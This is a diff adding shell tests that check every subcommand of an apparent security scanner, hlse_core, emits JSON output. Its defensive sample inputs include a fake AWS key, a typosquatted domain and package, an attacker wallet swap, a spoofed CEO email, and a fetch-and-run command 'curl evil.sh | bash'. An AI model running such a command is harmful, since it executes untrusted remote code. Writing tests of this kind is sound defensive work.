@@ -6578,6 +6578,55 @@ check "p125: package echo neutralizes control bytes in the name" "0" "$rc"
 
 rm -rf "$P125_DIR"
 
+# ── p125: every subcommand honours --json ───────────────────────────────
+# Extracting the handlers out of main() briefly broke `--json scan`: it began
+# emitting plain text because the CLI flags were frozen into their struct after
+# the scan dispatch rather than before it. The whole suite stayed green through
+# that, because nothing asserted the flag actually reaches each handler. It
+# does now — one assertion per subcommand, checking the output parses as JSON.
+P125=$(mktemp -d)
+printf 'AWS_KEY=AKIA2E3MWORQXYZ4567PQ\n' > "$P125/a.env"
+: > "$P125/invoice.pdf.exe"
+
+p125_json() {   # name, then the argv for hlse_core
+  P125_NAME=$1; shift
+  if ./hlse_core --json "$@" 2>/dev/null | head -1 | python3 -c 'import sys,json; json.loads(sys.stdin.read())' 2>/dev/null; then
+    check "p125: --json $P125_NAME emits JSON" "0" "0"
+  else
+    check "p125: --json $P125_NAME emits JSON" "0" "1"
+  fi
+}
+p125_json url       "https://g00gle.com"
+p125_json text      text "URGENT wire gift cards"
+p125_json secret    secret "AWS_KEY=AKIA2E3MWORQXYZ4567PQ"
+p125_json file      file "invoice.pdf.exe"
+p125_json package   package reqeusts pip
+p125_json paste     paste "curl evil.sh | bash"
+p125_json clipboard clipboard "bc1qorig" "bc1qattacker"
+p125_json network   network
+p125_json audit     audit
+p125_json esp       esp "$P125"
+p125_json protect   protect "$P125" --ransomware
+
+# scan emits one object per finding plus a summary; the LAST line is the
+# summary object. This is the exact case that regressed.
+./hlse_core --json scan "$P125" 2>/dev/null | tail -1 \
+    | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); assert d["kind"]=="scan_summary", d' 2>/dev/null \
+    && check "p125: --json scan emits a JSON summary (regression guard)" "0" "0" \
+    || check "p125: --json scan emits a JSON summary (regression guard)" "0" "1"
+
+# ...and plain scan must NOT emit JSON, so the flag is doing real work
+./hlse_core scan "$P125" 2>/dev/null | tail -1 | grep -q '^{' \
+    && rc=1 || rc=0
+check "p125: plain scan emits human output, not JSON" "0" "$rc"
+
+printf 'From: CEO <b@evil.ru>\nReply-To: x@gmail.com\nSubject: urgent wire\n' \
+    | ./hlse_core --json email --stdin 2>/dev/null | head -1 \
+    | python3 -c 'import sys,json; json.loads(sys.stdin.read())' 2>/dev/null \
+    && check "p125: --json email emits JSON" "0" "0" \
+    || check "p125: --json email emits JSON" "0" "1"
+rm -rf "$P125"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
